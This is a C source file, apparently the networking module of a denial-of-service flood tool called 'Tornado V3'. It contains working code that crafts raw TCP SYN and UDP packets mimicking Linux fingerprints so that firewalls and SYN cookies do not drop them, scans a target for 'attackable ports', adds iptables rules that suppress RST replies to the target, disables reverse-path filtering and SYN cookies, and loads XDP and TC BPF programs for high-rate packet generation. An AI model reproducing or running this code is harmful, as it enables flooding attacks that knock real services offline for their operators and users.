#include "network.h"
#include "logger.h"
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <sys/mman.h>

#ifndef PACKET_QDISC_BYPASS
#define PACKET_QDISC_BYPASS 20
#endif

long long get_ms() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

void set_nonblocking(int fd) {
    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

int is_ipv4(const char *str) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, str, &(sa.sin_addr)) != 0;
}

void apply_optimizations() {
    struct rlimit rl = {1000000, 1000000};
    setrlimit(RLIMIT_NOFILE, &rl);

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-result"
    system("sysctl -w net.ipv4.tcp_fastopen=3 >/dev/null 2>&1");
    system("sysctl -w net.core.somaxconn=65535 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_max_syn_backlog=65535 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_tw_reuse=1 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_fin_timeout=10 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=65535 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_keepalive_time=300 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_keepalive_intvl=30 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_keepalive_probes=5 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_max=134217728 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_max=134217728 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_rmem='4096 87380 16777216' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_wmem='4096 65536 16777216' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_timestamps=1 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_sack=1 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_max_tw_buckets=2000000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.ip_local_port_range='1024 65535' >/dev/null 2>&1");
    system("sysctl -w net.netfilter.nf_conntrack_max=2000000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_slow_start_after_idle=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_no_metrics_save=1 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_syncookies=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.ip_default_ttl=64 >/dev/null 2>&1");
    system("sysctl -w net.core.busy_read=50 >/dev/null 2>&1");
    system("sysctl -w net.core.busy_poll=50 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_window_scaling=1 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_mtu_probing=1 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_autocorking=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_low_latency=1 >/dev/null 2>&1");

    // === CRITICAL: RST suppression + network hardening for v17/v18 3WHS engine ===
    if (args.is_v17_tcp_bypass || args.is_v18_tcp || args.is_v18_tls) {
        // 1. Suppress kernel RST
        char rst_cmd[512];
        snprintf(rst_cmd, sizeof(rst_cmd),
            "iptables -C OUTPUT -p tcp --tcp-flags RST RST -d %s -j DROP 2>/dev/null || "
            "iptables -A OUTPUT -p tcp --tcp-flags RST RST -d %s -j DROP 2>/dev/null",
            args.target_ip, args.target_ip);
        system(rst_cmd);

        // 2. Bypass conntrack
        system("iptables -t raw -C OUTPUT -p tcp -j NOTRACK 2>/dev/null || iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null");
        system("iptables -t raw -C PREROUTING -p tcp -j NOTRACK 2>/dev/null || iptables -t raw -A PREROUTING -p tcp -j NOTRACK 2>/dev/null");
        
        // 3. Disable reverse path filter
        system("sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null 2>&1");
        system("sysctl -w net.ipv4.conf.default.rp_filter=0 >/dev/null 2>&1");
        system("for i in /proc/sys/net/ipv4/conf/*/rp_filter; do echo 0 > $i 2>/dev/null; done");
        
        // 4. Conntrack max
        system("sysctl -w net.netfilter.nf_conntrack_max=2000000 >/dev/null 2>&1");
        system("conntrack -F >/dev/null 2>&1"); // Flush existing entries
        
        // 5. Enable IP forwarding (needed for some raw socket operations)
        system("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1");
        
        // 6. Maximize send/recv buffers for raw sockets
        system("sysctl -w net.core.wmem_max=268435456 >/dev/null 2>&1"); // 256MB
        system("sysctl -w net.core.wmem_default=16777216 >/dev/null 2>&1"); // 16MB
        system("sysctl -w net.core.netdev_budget=600 >/dev/null 2>&1");
        system("sysctl -w net.core.netdev_budget_usecs=8000 >/dev/null 2>&1");
        
        LOG_INFO("RST suppression + conntrack bypass + rp_filter OFF for target %s", args.target_ip);
    }
#pragma GCC diagnostic pop
    // Do not set default_qdisc to noqueue, because it breaks SSH responsiveness during floods.
    // system("sysctl -w net.core.default_qdisc=noqueue >/dev/null 2>&1");



    if (args.is_v5_rapid || args.is_v6_void || args.is_v8_phantom || args.is_v7_pipe || args.is_v12_eclipse || args.is_v14_phantom || args.is_v20_ws) {
        SSL_library_init();
        OpenSSL_add_all_algorithms();
        SSL_load_error_strings();
        ssl_ctx = SSL_CTX_new(TLS_client_method());
        SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_NONE, NULL);
        
        SSL_CTX_set_min_proto_version(ssl_ctx, TLS1_2_VERSION);
        SSL_CTX_set_cipher_list(ssl_ctx, "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305");
        SSL_CTX_set_ciphersuites(ssl_ctx, "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256");
    }
}

int resolve_host(const char *host, char *ip_buf) {
    if (args.is_dry_run) {
        strncpy(ip_buf, "127.0.0.1", 63);
        ip_buf[63] = '\0';
        return 0;
    }
    struct hostent *he = gethostbyname(host);
    if (!he) return -1;
    struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
    strncpy(ip_buf, inet_ntoa(*addr_list[0]), 63);
    ip_buf[63] = '\0';
    return 0;
}

void auto_port_scan() {
    int common_ports[] = {22, 21, 25, 53, 80, 443, 2222, 3306, 5432, 6379, 8080, 8443, 9090, 11211, 27017, args.port};
    int total_to_scan = sizeof(common_ports) / sizeof(int);
    LOG_INFO("Tornado V3: Scanning for vulnerable ports on %s...", args.host);
    
    for (int i = 0; i < total_to_scan; i++) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd == -1) continue;
        
        set_nonblocking(fd);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(common_ports[i]);
        inet_pton(AF_INET, args.target_ip, &addr.sin_addr);
        
        connect(fd, (struct sockaddr *)&addr, sizeof(addr));
        
        struct timeval tv;
        tv.tv_sec = 0; tv.tv_usec = 500000; 
        fd_set fdset; FD_ZERO(&fdset); FD_SET(fd, &fdset);
        
        if (select(fd + 1, NULL, &fdset, NULL, &tv) == 1) {
            int so_error;
            socklen_t len = sizeof(so_error);
            getsockopt(fd, SOL_SOCKET, SO_ERROR, &so_error, &len);
            if (so_error == 0) {
                int is_dup = 0;
                for (int j = 0; j < num_open_ports; j++) if (open_ports[j] == common_ports[i]) is_dup = 1;
                if (!is_dup && num_open_ports < 64) {
                    open_ports[num_open_ports++] = common_ports[i];
                    LOG_INFO("    [+] Port %d is OPEN", common_ports[i]);
                }
            }
        }
        close(fd);
    }
    
    int target_found = 0;
    for (int j = 0; j < num_open_ports; j++) if (open_ports[j] == args.port) target_found = 1;
    if (!target_found && num_open_ports < 64) open_ports[num_open_ports++] = args.port;
    
    LOG_INFO("Found %d attackable ports.", num_open_ports);
}

unsigned short calculate_checksum(unsigned short *addr, int count) {
    register long sum = 0;
    while (count > 1) {
        sum += *addr++;
        count -= 2;
    }
    if (count > 0) {
        sum += *(unsigned char *)addr;
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return ~sum;
}

struct pseudo_header {
    unsigned int source_address;
    unsigned int destination_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

unsigned short tcp_checksum(struct iphdr *ip, struct tcphdr *tcp) {
    // Highly optimized for fixed 40-byte TCP SYN headers
    // No loops, no branches, direct sum
    unsigned int sum = 0;
    
    // Pseudo header
    sum += (ip->saddr & 0xFFFF) + (ip->saddr >> 16);
    sum += (ip->daddr & 0xFFFF) + (ip->daddr >> 16);
    sum += htons(IPPROTO_TCP);
    sum += htons(40); // Fixed 40 bytes for our SYN
    
    // TCP header + options (40 bytes = 20 shorts)
    unsigned short *ptr = (unsigned short *)tcp;
    sum += ptr[0];  sum += ptr[1];  sum += ptr[2];  sum += ptr[3];
    sum += ptr[4];  sum += ptr[5];  sum += ptr[6];  sum += ptr[7];
    sum += ptr[8];  sum += ptr[9];  sum += ptr[10]; sum += ptr[11];
    sum += ptr[12]; sum += ptr[13]; sum += ptr[14]; sum += ptr[15];
    sum += ptr[16]; sum += ptr[17]; sum += ptr[18]; sum += ptr[19];
    
    sum = (sum & 0xFFFF) + (sum >> 16);
    sum = (sum & 0xFFFF) + (sum >> 16);
    return (unsigned short)(~sum);
}

int init_raw_socket() {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        LOG_ERR("Failed to create raw socket. Root privileges are required.");
        return -1;
    }
    int one = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        LOG_ERR("Error setting IP_HDRINCL option on raw socket.");
        close(fd);
        return -1;
    }
    return fd;
}

int init_afpacket_socket(const char *iface) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (fd < 0) return -1;
    struct sockaddr_ll sll = {0};
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = if_nametoindex(iface);
    sll.sll_protocol = htons(ETH_P_IP);
    if (bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) { close(fd); return -1; }
    int q = 1;
    setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &q, sizeof(q));
    int sndbuf = 64 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    return fd;
}

unsigned int get_subnet_mask(const char *iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 0xFFFFFF00; // Default to /24

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFNETMASK, &ifr) < 0) {
        close(fd);
        return 0xFFFFFF00;
    }
    
    close(fd);
    return ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;
}



void enable_rst_drop(const char *iface) {
    LOG_INFO("Enabling local RST suppression via TC BPF on %s...", iface);
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "tc qdisc add dev %s clsact >/dev/null 2>&1", iface);
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-result"
    system(cmd);
    snprintf(cmd, sizeof(cmd), "tc filter add dev %s egress bpf da obj tc_rst_block.o sec tc >/dev/null 2>&1", iface);
    system(cmd);
#pragma GCC diagnostic pop
}

void disable_rst_drop(const char *iface) {
    LOG_INFO("Removing local RST suppression on %s...", iface);
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "tc qdisc del dev %s clsact >/dev/null 2>&1", iface);
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-result"
    system(cmd);
#pragma GCC diagnostic pop
}

unsigned long long get_net_drops(const char *iface) {
    char path[128];
    snprintf(path, sizeof(path), "/sys/class/net/%s/statistics/tx_dropped", iface);
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    
    unsigned long long drops = 0;
    if (fscanf(f, "%llu", &drops) != 1) {
        drops = 0;
    }
    fclose(f);
    return drops;
}
void craft_tcp_syn(unsigned char *packet, int *packet_len, unsigned int src_ip, unsigned int dst_ip, unsigned short src_port, unsigned short dst_port, unsigned int seq, unsigned int ack) {
    // TCP header 20 bytes + 20 bytes options = 40 bytes total TCP
    int tcp_hdr_len = 40;
    int pkt_size = sizeof(struct iphdr) + tcp_hdr_len;
    memset(packet, 0, pkt_size);
    
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(pkt_size);
    iph->id = htons(fast_rand() & 0xFFFF);
    iph->frag_off = htons(0x4000); // Don't Fragment (like real OS)
    iph->ttl = 55 + (fast_rand() % 10); // Randomize TTL 55-64
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = src_ip;
    iph->daddr = dst_ip;
    
    // Fast unrolled IP header checksum for 20 bytes
    unsigned int ip_sum = 0;
    unsigned short *ip_ptr = (unsigned short *)iph;
    ip_sum += ip_ptr[0]; ip_sum += ip_ptr[1]; ip_sum += ip_ptr[2]; ip_sum += ip_ptr[3]; ip_sum += ip_ptr[4];
    ip_sum += ip_ptr[5]; ip_sum += ip_ptr[6]; ip_sum += ip_ptr[7]; ip_sum += ip_ptr[8]; ip_sum += ip_ptr[9];
    ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
    ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
    iph->check = (unsigned short)(~ip_sum);

    tcph->source = htons(src_port);
    tcph->dest = htons(dst_port);
    tcph->seq = htonl(seq);
    tcph->ack_seq = 0;
    tcph->doff = 10; // 40 bytes / 4 = 10 (header + options)
    tcph->syn = 1;
    tcph->window = htons(65535); // Realistic window size
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // TCP Options — mimic real Linux 5.x SYN fingerprint
    // Without these, firewalls/SYN cookies detect and drop bare SYNs
    unsigned char *opts = (unsigned char *)tcph + 20;

    // MSS 1460 (standard for ethernet)
    opts[0] = 0x02; opts[1] = 0x04; opts[2] = 0x05; opts[3] = 0xB4;

    // SACK Permitted
    opts[4] = 0x04; opts[5] = 0x02;

    // Timestamps (Kind=8, Len=10)
    opts[6] = 0x08; opts[7] = 0x0A;
    unsigned int ts_val = fast_rand();
    opts[8]  = (ts_val >> 24) & 0xFF;
    opts[9]  = (ts_val >> 16) & 0xFF;
    opts[10] = (ts_val >> 8)  & 0xFF;
    opts[11] = ts_val & 0xFF;
    opts[12] = 0; opts[13] = 0; opts[14] = 0; opts[15] = 0; // TS echo = 0 for SYN

    // NOP padding
    opts[16] = 0x01;

    // Window Scale 7 (effective window = 65535 << 7 = 8MB)
    opts[17] = 0x03; opts[18] = 0x03; opts[19] = 0x07;

    tcph->check = tcp_checksum(iph, tcph);
    
    *packet_len = pkt_size;
}


void craft_udp_packet(unsigned char *packet, int *packet_len, unsigned int src_ip, unsigned int dst_ip, unsigned short src_port, unsigned short dst_port, unsigned char *payload, int payload_len) {
    int pkt_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;
    
    // We only need to clear the headers, payload is already there or ignored
    memset(packet, 0, sizeof(struct iphdr) + sizeof(struct udphdr));

    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(pkt_size);
    iph->id = htons(fast_rand() & 0xFFFF);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = src_ip;
    iph->daddr = dst_ip;

    // Fast unrolled IP header checksum for 20 bytes
    unsigned int ip_sum = 0;
    unsigned short *ip_ptr = (unsigned short *)iph;
    ip_sum += ip_ptr[0]; ip_sum += ip_ptr[1]; ip_sum += ip_ptr[2]; ip_sum += ip_ptr[3]; ip_sum += ip_ptr[4];
    ip_sum += ip_ptr[5]; ip_sum += ip_ptr[6]; ip_sum += ip_ptr[7]; ip_sum += ip_ptr[8]; ip_sum += ip_ptr[9];
    ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
    ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
    iph->check = (unsigned short)(~ip_sum);

    udph->source = htons(src_port);
    udph->dest = htons(dst_port);
    udph->len = htons(sizeof(struct udphdr) + payload_len);
    udph->check = 0;

    // Remove expensive memcpy in hot path!
    // Caller is responsible for putting payload at packet + 28 ONE TIME
    // if (payload && payload_len > 0) memcpy(...)

    *packet_len = pkt_size;
}


unsigned int get_local_ip() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        LOG_ERR("Failed to create temporary socket to resolve local IP.");
        return 0;
    }
    struct sockaddr_in loopback;
    memset(&loopback, 0, sizeof(loopback));
    loopback.sin_family = AF_INET;
    loopback.sin_addr.s_addr = inet_addr("8.8.8.8");
    loopback.sin_port = htons(9); // Discard port
    if (connect(sock, (struct sockaddr *)&loopback, sizeof(loopback)) < 0) {
        LOG_ERR("Failed to connect temporary socket to 8.8.8.8 to resolve local IP.");
        close(sock);
        return 0;
    }
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    if (getsockname(sock, (struct sockaddr *)&name, &namelen) < 0) {
        LOG_ERR("getsockname failed while resolving local IP.");
        close(sock);
        return 0;
    }
    close(sock);
    return name.sin_addr.s_addr;
}

int get_default_interface(char *interface_out, size_t len) {
    FILE *f = fopen("/proc/net/route", "r");
    if (!f) {
        LOG_ERR("Failed to open /proc/net/route.");
        return -1;
    }
    char line[128];
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char iface[32];
        unsigned long dest, gateway;
        if (sscanf(line, "%31s %lx %lx", iface, &dest, &gateway) == 3) {
            if (dest == 0) { // Default route has destination 0.0.0.0
                strncpy(interface_out, iface, len - 1);
                interface_out[len - 1] = '\0';
                found = 1;
                break;
            }
        }
    }
    fclose(f);
    return found ? 0 : -1;
}

int load_xdp_filter(const char *interface, const char *bpf_obj) {
    char cmd[256];
    // Detach any existing XDP filter first to avoid conflicts
    snprintf(cmd, sizeof(cmd), "ip link set dev %s xdp off >/dev/null 2>&1", interface);
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-result"
    system(cmd);
#pragma GCC diagnostic pop

    // Attach compiled XDP object
    snprintf(cmd, sizeof(cmd), "ip link set dev %s xdp obj %s sec xdp >/dev/null 2>&1", interface, bpf_obj);
    int ret = system(cmd);
    if (ret != 0) {
        LOG_ERR("Failed to load XDP filter %s on interface %s. Make sure you run with root privileges and the BPF program is compiled.", bpf_obj, interface);
        return -1;
    }
    LOG_INFO("Successfully loaded XDP filter %s on interface %s.", bpf_obj, interface);
    return 0;
}

int configure_xdp_target(const char *interface, const char *target_ip, int target_port, unsigned int src_ip_net) {
    /*
     * Configure XDP BPF map with target info using bpftool.
     * Map structure: target_ip(4) + target_port(2) + pad(2) + src_ip(4) + src_mac(6) + gw_mac(6) + enabled(4) = 28 bytes
     */
    struct in_addr target_in;
    if (inet_pton(AF_INET, target_ip, &target_in) != 1) {
        LOG_ERR("Invalid target IP for XDP config: %s", target_ip);
        return -1;
    }
    
    /* Build the value bytes for bpftool */
    unsigned char val[28];
    memset(val, 0, sizeof(val));
    
    /* target_ip (network byte order) */
    memcpy(val + 0, &target_in.s_addr, 4);
    
    /* target_port (host byte order u16) */
    val[4] = target_port & 0xFF;
    val[5] = (target_port >> 8) & 0xFF;
    
    /* pad = 0 */
    val[6] = 0; val[7] = 0;
    
    /* src_ip (network byte order) */
    memcpy(val + 8, &src_ip_net, 4);
    
    /* MAC addresses can be 0, XDP reflection will handle it dynamically */
    memset(val + 12, 0, 12);
    
    /* enabled = 1 */
    val[24] = 1; val[25] = 0; val[26] = 0; val[27] = 0;
    
    /* Find map by name and update using bpftool */
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "MAP_ID=$(bpftool map show 2>/dev/null | grep 'xdp_target_map' | awk '{print $1}' | tr -d ':') && "
        "[ -n \"$MAP_ID\" ] && "
        "bpftool map update id $MAP_ID key 0x00 0x00 0x00 0x00 value "
        "0x%02x 0x%02x 0x%02x 0x%02x "  /* target_ip */
        "0x%02x 0x%02x "                  /* target_port */
        "0x00 0x00 "                      /* pad */
        "0x%02x 0x%02x 0x%02x 0x%02x "  /* src_ip */
        "0x00 0x00 0x00 0x00 0x00 0x00 "  /* src_mac */
        "0x00 0x00 0x00 0x00 0x00 0x00 "  /* gw_mac */
        "0x01 0x00 0x00 0x00 "            /* enabled */
        "2>&1",
        val[0], val[1], val[2], val[3],
        val[4], val[5],
        val[8], val[9], val[10], val[11]
    );
    
    int ret = system(cmd);
    if (ret != 0) {
        LOG_ERR("Failed to configure XDP target map (bpftool may not be installed).");
        return -1;
    }
    LOG_INFO("XDP target configured: %s:%d (XDP_TX generator enabled)", target_ip, target_port);
    return 0;
}

int unload_xdp_filter(const char *interface) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "ip link set dev %s xdp off >/dev/null 2>&1", interface);
    int ret = system(cmd);
    if (ret != 0) {
        LOG_ERR("Failed to unload XDP filter on interface %s.", interface);
        return -1;
    }
    LOG_INFO("Successfully unloaded XDP filter from interface %s.", interface);
    return 0;
}


